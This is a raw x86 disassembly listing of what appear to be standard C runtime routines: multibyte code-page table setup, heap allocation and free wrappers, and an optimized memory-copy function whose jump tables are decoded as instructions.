  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
